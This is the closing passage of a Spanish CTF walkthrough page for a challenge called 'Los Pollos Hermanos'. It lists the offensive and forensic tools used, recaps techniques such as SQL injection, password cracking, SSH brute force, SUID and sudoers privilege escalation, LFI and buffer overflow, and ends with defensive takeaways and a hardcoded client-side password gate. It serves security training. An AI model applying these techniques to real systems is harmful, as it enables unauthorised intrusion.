rutas ocultas.</p>
<p><strong>enum4linux</strong><br />
Script para recopilar informaciÃ³n de sistemas Windows/Samba usando
consultas SMB.</p>
<p><strong>exiftool</strong><br />
Analizador y editor de metadatos en archivos multimedia (imÃ¡genes,
audio, PDF, etc.).</p>
<p><strong>file</strong><br />
Comando clÃ¡sico de Linux para identificar el tipo de archivo segÃºn su
contenido y cabeceras.</p>
<p><strong>gobuster</strong><br />
Herramienta de fuerza bruta rÃ¡pida para directorios, archivos y
subdominios web.</p>
<p><strong>grep</strong><br />
Herramienta de bÃºsqueda de texto por patrones (regex) en archivos o
salidas de comandos.</p>
<p><strong>HxD Hex Editor</strong><br />
Editor hexadecimal para Windows, Ãºtil en anÃ¡lisis forense y manipulaciÃ³n
de binarios.</p>
<p><strong>hydra</strong><br />
Herramienta de fuerza bruta para romper credenciales en mÃºltiples
servicios de red.</p>
<p><strong>John the Ripper</strong><br />
Cracker de contraseÃ±as que soporta mÃºltiples algoritmos de hash.</p>
<p><strong>md5sum</strong><br />
Utilidad de Linux para calcular y verificar sumas de comprobaciÃ³n
MD5.</p>
<p><strong>nc (netcat)</strong><br />
Herramienta versÃ¡til para crear conexiones TCP/UDP, depuraciÃ³n de redes
y transferencias.</p>
<p><strong>nikto</strong><br />
EscÃ¡ner de vulnerabilidades web que detecta configuraciones inseguras y
archivos expuestos.</p>
<p><strong>nmap</strong><br />
EscÃ¡ner de red para descubrimiento de hosts, puertos y servicios, con
potentes scripts NSE.</p>
<p><strong>pdftotext</strong><br />
Conversor de PDFs a texto plano, Ãºtil en forense y anÃ¡lisis de
documentos.</p>
<p><strong>rar2john</strong><br />
Herramienta auxiliar de John the Ripper para extraer hashes de archivos
RAR y romperlos.</p>
<p><strong>rpcclient</strong><br />
Cliente SMB para interactuar con servicios RPC en sistemas Windows
(enumeraciÃ³n de usuarios, shares, etc.).</p>
<p><strong>searchsploit</strong><br />
Interfaz local a la base de datos Exploit-DB para buscar exploits y
PoCs.</p>
<p><strong>smbclient</strong><br />
Cliente SMB/CIFS que permite conectarse a recursos compartidos en
Windows/Linux.</p>
<p><strong>strings</strong><br />
Extrae cadenas legibles de archivos binarios (Ãºtil en ingenierÃ­a inversa
y forense).</p>
<p><strong>tshark</strong><br />
VersiÃ³n CLI de Wireshark para captura y anÃ¡lisis de trÃ¡fico en red.</p>
<p><strong>wfuzz</strong><br />
Herramienta de fuzzing para aplicaciones web, permite descubrir rutas,
parÃ¡metros y vulnerabilidades.</p>
<p><strong>Wireshark</strong><br />
Analizador grÃ¡fico de protocolos de red, muy usado en seguridad y
anÃ¡lisis forense.</p>
</blockquote>
<p><strong><br />
</strong></p>
<h1 id="herramientas-online-utilizadas"><strong>ğŸ§° Herramientas Online
Utilizadas</strong></h1>
<blockquote>
<p><strong>dtmf.netlify.app</strong><br />
Generador de tonos DTMF (teclado telefÃ³nico) directamente desde el
navegador.</p>
<p><strong>hash.online-convert.com</strong><br />
Portal de conversiÃ³n de hashes online (MD5, SHA1, etc.).</p>
<p><a
href="https://base64encode.org/es/"><strong><u>https://base64encode.org/es/</u></strong></a><br />
Codificador/decodificador Base64 en lÃ­nea.</p>
<p><a
href="https://braillecaster.net/"><strong><u>https://braillecaster.net/</u></strong></a><br />
Herramienta para convertir texto a Braille y viceversa.</p>
<p><a
href="https://brailletranslator.org/es.html"><strong><u>https://brailletranslator.org/es.html</u></strong></a><br />
Traductor de texto a Braille y de Braille a texto en espaÃ±ol.</p>
<p><a
href="https://ciphersonline.com/es/cifrado-atbash"><strong><u>https://ciphersonline.com/es/cifrado-atbash</u></strong></a><br />
Traductor online del cifrado clÃ¡sico Atbash.</p>
<p><a
href="https://convertbinary.com/de-binario-a-texto/"><strong><u>https://convertbinary.com/de-binario-a-texto/</u></strong></a><br />
Conversor de binario a texto y viceversa.</p>
<p><a
href="https://convertstring.com/es/EncodeDecode/Base64Decode"><strong><u>https://convertstring.com/es/EncodeDecode/Base64Decode</u></strong></a><br />
Herramienta online para decodificar y codificar en Base64.</p>
<p><a
href="https://dcode.fr/caesar-cipher"><strong><u>https://dcode.fr/caesar-cipher</u></strong></a><br />
Decodificador/analizador para el cifrado CÃ©sar.</p>
<p><a
href="https://dcode.fr/cifrado-pigpen"><strong><u>https://dcode.fr/cifrado-pigpen</u></strong></a><br />
Decodificador/analizador para el cifrado Pigpen (masÃ³nico).</p>
<p><a
href="https://emn178.github.io/online-tools/md5_checksum.html"><strong><u>https://emn178.github.io/online-tools/md5_checksum.html</u></strong></a><br />
Generador y verificador de checksums MD5 en lÃ­nea.</p>
<p><a
href="https://generator-qr.com/"><strong><u>https://generator-qr.com/</u></strong></a><br />
Generador de cÃ³digos QR online.</p>
<p><a
href="https://hash.online-convert.com/es/generador-md5"><strong><u>https://hash.online-convert.com/es/generador-md5</u></strong></a><br />
Herramienta para generar hash MD5 de cadenas o archivos.</p>
<p><a
href="https://md5decrypt.net/en/Brainfuck-translator/"><strong><u>https://md5decrypt.net/en/Brainfuck-translator/</u></strong></a><br />
Traductor de/para el lenguaje esotÃ©rico Brainfuck.</p>
<p><a
href="https://openl.io/es/translate/braille"><strong><u>https://openl.io/es/translate/braille</u></strong></a><br />
Traductor de Braille a texto y texto a Braille.</p>
<p><a
href="https://photo333.com/text-to-octal-es.php"><strong><u>https://photo333.com/text-to-octal-es.php</u></strong></a><br />
Conversor de texto a octal (y viceversa) en lÃ­nea.</p>
<p><a
href="https://seostudio.tools/es/text-to-octal"><strong><u>https://seostudio.tools/es/text-to-octal</u></strong></a><br />
Otra herramienta para convertir texto a octal y de octal a texto.</p>
<p><strong>onlinesound.net/dtmf-generator</strong><br />
Generador de tonos DTMF en lÃ­nea (similar a dtmf.netlify.app).</p>
<p><strong>online-convert.com</strong><br />
Plataforma general de conversiones de archivos y formatos
(multiformato).</p>
</blockquote>
<p><strong><br />
</strong></p>
<h1 id="resumen-final"><strong>ğŸ Resumen Final</strong></h1>
<p>Has recorrido un camino completo: no solo resolviste retos,
entrenaste mirada tÃ©cnica, paciencia y criterio. Al terminar â€œLos Pollos
Hermanosâ€, sabes reconocer patrones, validar hipÃ³tesis con datos y
moverte con soltura entre criptografÃ­a, forense, red, web y
explotaciÃ³nâ€”con una mentalidad metÃ³dica y transferible a otros CTF y
auditorÃ­as.</p>
<p><span id="_Toc207189969" class="anchor"></span><strong>Aprendizajes
clave</strong></p>
<ul>
<li><p><strong>EnumeraciÃ³n disciplinada:</strong> Escanear, catalogar
servicios, versiones y puertos (incluidos no estÃ¡ndar) antes de â€œtocarâ€
nada.</p></li>
<li><p><strong>AnÃ¡lisis de evidencias:</strong> Extraer valor de
archivos, capturas y metadatos con varias herramientas y corroboraciones
cruzadas.</p></li>
<li><p><strong>Cadenas de explotaciÃ³n:</strong> Convertir hallazgos en
accesos iniciales y, luego, en privilegios mÃ¡s altos de forma segura y
verificable.</p></li>
<li><p><strong>Pensamiento criptogrÃ¡fico:</strong> Reconocer cifrados
clÃ¡sicos/variantes, codificaciones y combinaciones multimodales (audio,
imagen, texto).</p></li>
<li><p><strong>Razonamiento forense:</strong> Trabajar con tiempos,
memoria, logs y formatos desconocidos sin presuponerâ€”validando con
firmas y contextos.</p></li>
<li><p><strong>Higiene operativa:</strong> Notas claras, pasos
reproducibles, verificaciones y lÃ­mites Ã©ticos.</p></li>
</ul>
<p><span id="_Toc207189970" class="anchor"></span><strong>Parte 1:
Moscas (criptografÃ­a, stego, forense, web, OSINT, red)</strong></p>
<ul>
<li><p><strong>Mosca 1 (Hex + espectrograma):</strong> Aprendiste a
detectar pistas en hexdumps y a interpretar espectrogramas para oculto
en audio/imÃ¡genes; combinaciÃ³n de stego y codificaciÃ³n.</p></li>
<li><p><strong>Mosca 2 (Brainfuck + Exiftool):</strong> Identificaste un
lenguaje esotÃ©rico y la extracciÃ³n de metadatos; reforzaste la idea de
â€œlo visible no es todoâ€.</p></li>
<li><p><strong>Mosca 3 (QR + editor hex):</strong> Comprendiste que un
QR puede estar alterado a bajo nivel; validar integridad/estructura con
ediciÃ³n hex y reconstrucciÃ³n.</p></li>
<li><p><strong>Mosca 4 (Pigpen + SQLi):</strong> Tradujiste un cifrado
clÃ¡sico y lo llevaste a un vector web (inyecciÃ³n SQL); conexiÃ³n entre
puzzle y explotaciÃ³n real.</p></li>
<li><p><strong>Mosca 5 (Crackeo RAR):</strong> Practicaste recuperaciÃ³n
de contraseÃ±as y evaluaciÃ³n de polÃ­ticas dÃ©biles; Ã©tica y lÃ­mites del
crackeo controlado.</p></li>
<li><p><strong>Mosca 6 (Imagen tÃ©rmica + Braille):</strong>
Interpretaste representaciones no textuales; convertir seÃ±ales visuales
en datos mediante mapas y alfabetos alternativos.</p></li>
<li><p><strong>Mosca 7 (Octal + hash):</strong> Reconociste
codificaciones numÃ©ricas y la identificaciÃ³n/verificaciÃ³n de hashes; no
confundir codificaciÃ³n con cifrado.</p></li>
<li><p><strong>Mosca 8 (Base64 + OSINT):</strong> Decodificaste y luego
investigaste; aprendiste a enlazar datos mÃ­nimos con fuentes abiertas
para contexto.</p></li>
<li><p><strong>Mosca 9 (ROT9 + DTMF):</strong> Combinaste un
desplazamiento con tonos telefÃ³nicos; entrenaste oÃ­do tÃ©cnico y lectura
de espectros/sonogramas.</p></li>
<li><p><strong>Mosca 10 (Atbash + pcap HTTP):</strong> Descifraste y
confirmaste en trÃ¡fico; reforzaste filtros y reconstrucciÃ³n de objetos
desde capturas.</p></li>
</ul>
<p><span id="_Toc207189971" class="anchor"></span><strong>Parte 2:
Banderas (sistemas, red, forense y privilegios)</strong></p>
<ul>
<li><p><strong>Bandera 1 (sudoers con chown):</strong> Detectaste un
abuso de sudoers revisando cuentas/servicios; entendiste por quÃ© chown
bajo sudo rompe fronteras de permisos.</p></li>
<li><p><strong>Bandera 2 (FTP anÃ³nimo):</strong> Enumeraste con Nmap y
validaste acceso sin credenciales; importancia de polÃ­ticas por defecto
seguras.</p></li>
<li><p><strong>Bandera 3 (binario SUID):</strong> Localizaste SUID con
bÃºsquedas de permisos; evaluaste rutas de escalada controlando binarios
privilegiados.</p></li>
<li><p><strong>Bandera 4 (archivos sin extensiÃ³n):</strong> Clasificaste
por firmas mÃ¡gicas con file/binwalk/trid/xxd; no confiar en
extensiones.</p></li>
<li><p><strong>Bandera 5 (DNS en pcap):</strong> Filtraste consultas (p.
ej., dns.qry.name) y extraÃ­ste indicadores; valor del trÃ¡fico claro para
pivotar.</p></li>
<li><p><strong>Bandera 6 (Samba CVE-2017):</strong> Relacionaste
banners/servicios con CVEs conocidos y exploraste acceso con smbclient;
mapping de shares y cuentas (usuario tyrus).</p></li>
<li><p><strong>Bandera 7 (SSH dÃ©bil â€“ saul):</strong> Practicaste fuerza
bruta responsable contra contraseÃ±as triviales; reforzaste bloqueo de
credenciales dÃ©biles.</p></li>
<li><p><strong>Bandera 8 (TLS en pcap):</strong> ExtraÃ­ste y analizaste
certificados; comprendiste huellas, validez y pistas de
identidad/infraestructura.</p></li>
<li><p><strong>Bandera 9 (Netcat 31337):</strong> Confirmaste que un
escaneo completo revela servicios â€œescondidosâ€; nunca asumas el top
1000.</p></li>
<li><p><strong>Bandera 10 (LFI PHP):</strong> Identificaste patrones de
inclusiÃ³n local y rutas de lectura; validaste impacto con ficheros
sensibles.</p></li>
<li><p><strong>Bandera 11 (Guion PDF):</strong> Navegaste un puzzle
posicional dentro de un PDF; lecciÃ³n: el formato tambiÃ©n es superficie
de juego.</p></li>
<li><p><strong>Bandera 12 (MÃ¡quina del tiempo):</strong> Detectaste
timestomping (ctime alterado); importancia de mÃºltiples lÃ­neas de tiempo
(atime/mtime/ctime).</p></li>
<li><p><strong>Bandera 13 (auth.log falso):</strong> Separaste ruido de
seÃ±al en logs; bÃºsquedas focalizadas (grep Accepted) y detecciÃ³n de
artefactos falsos.</p></li>
<li><p><strong>Bandera 14 (RAM â€“ mem.raw):</strong> Raspaste memoria con
strings y filtros; puertas rÃ¡pidas a secretos en dumps y cuÃ¡ndo pasar a
herramientas mÃ¡s ricas.</p></li>
<li><p><strong>Bandera 15 (Buffer Overflow):</strong> Instrumentaste con
GDB, patrones y direcciÃ³n de funciÃ³n; bases de explotaciÃ³n segura y
control de flujo.</p></li>
</ul>
<p><span id="_Toc207189972" class="anchor"></span><strong>Buenas
prÃ¡cticas y mentalidad tÃ©cnica</strong></p>
<ul>
<li><p><strong>Modelo de trabajo:</strong> Enumerar â†’ formular hipÃ³tesis
â†’ probar con mÃ­nima intrusiÃ³n â†’ evidenciar â†’ documentar â†’
revisar.</p></li>
<li><p><strong>TriangulaciÃ³n de pistas:</strong> Una tÃ©cnica rara vez
basta; combinar metadatos, red y contenido crÃ­ptico acelera
hallazgos.</p></li>
<li><p><strong>Rigor forense:</strong> Conservar originales, trabajar
con copias, registrar hashes y tiempos; separar observaciÃ³n de
interpretaciÃ³n.</p></li>
<li><p><strong>GestiÃ³n de contraseÃ±as:</strong> PolÃ­ticas robustas,
detecciÃ³n de reuse y listas negras; enseÃ±ar con ejemplos de fallos
reales del reto.</p></li>
<li><p><strong>Seguridad defensiva:</strong> Cada bandera sugiere un
control: deshabilitar anÃ³nimo, limitar SUID, endurecer sudoers, validar
entrada, segmentar puertos, monitorizar logs.</p></li>
<li><p><strong>Reproducibilidad:</strong> GuÃ­as de comandos, filtros y
firmas; scripts/one-liners para repetir anÃ¡lisis sin sesgos.</p></li>
<li><p><strong>Ã‰tica y alcance:</strong> Practicar solo en entornos
permitidos; convertir lo aprendido en recomendaciones de mejora, no en
daÃ±o.</p></li>
</ul>
<p><span id="_Toc207189973" class="anchor"></span><strong>QuÃ© te llevas
aplicado al â€œmundo realâ€</strong></p>
<ul>
<li><p><strong>Hardening inmediato:</strong> Revisar sudoers, SUID,
servicios expuestos, contraseÃ±as y shares Samba; cerrar anÃ³nimos y
puertos no usados.</p></li>
<li><p><strong>Monitoreo Ãºtil:</strong> Alertas sobre patrones en logs
(intentos SSH, cambios de tiempo), certificados anÃ³malos y trÃ¡fico
DNS/HTTP inusual.</p></li>
<li><p><strong>Respuesta a incidentes:</strong> ExtracciÃ³n rÃ¡pida de
indicios desde pcap, dumps de memoria y documentos; plan de contenciÃ³n
basado en evidencia.</p></li>
<li><p><strong>Capacidad de investigaciÃ³n:</strong> Reconocer
cifrados/codificaciones y rutas de LFI/SQLi; reducir tiempo de detecciÃ³n
y de explotaciÃ³n en pruebas controladas.</p></li>
</ul>
<p><span id="_Toc207189974" class="anchor"></span><strong>Siguientes
pasos para consolidar</strong></p>
<ul>
<li><p><strong>Practicar variaciones:</strong> Repite cada mosca con un
twist (otro cifrado, otro contenedor, otro filtro en pcap) y documenta
diferencias.</p></li>
<li><p><strong>Automatizar lo repetible:</strong> Crea pequeÃ±os scripts
para enumeraciÃ³n, bÃºsqueda de SUID, filtros en pcap y extracciÃ³n de
metadatos.</p></li>
<li><p><strong>Escribir un postmortem:</strong> QuÃ© te bloqueÃ³, cÃ³mo lo
destrabaste, quÃ© check aÃ±adirÃ¡s a tu rutina; convierte aprendizajes en
hÃ¡bitos.</p></li>
<li><p><strong>Simular defensa:</strong> Por cada vector que explotaste,
define un control de detecciÃ³n y uno de prevenciÃ³n en un entorno de
lab.</p></li>
</ul>
<p><img src="cookbook/media/image202.png"
style="width:8.27014in;height:11.30694in" /></p>
</div>

<script>
  function verificar() {
    const password = document.getElementById("clave").value;
    const correcto = "lospolloshermanos"; // contraseÃ±a
    if (password === correcto) {
      document.getElementById("contenido").style.display = "block";
      document.getElementById("login").style.display = "none";
    } else {
      alert("ContraseÃ±a incorrecta âŒ");
    }
  }
</script>

</body>
</html>
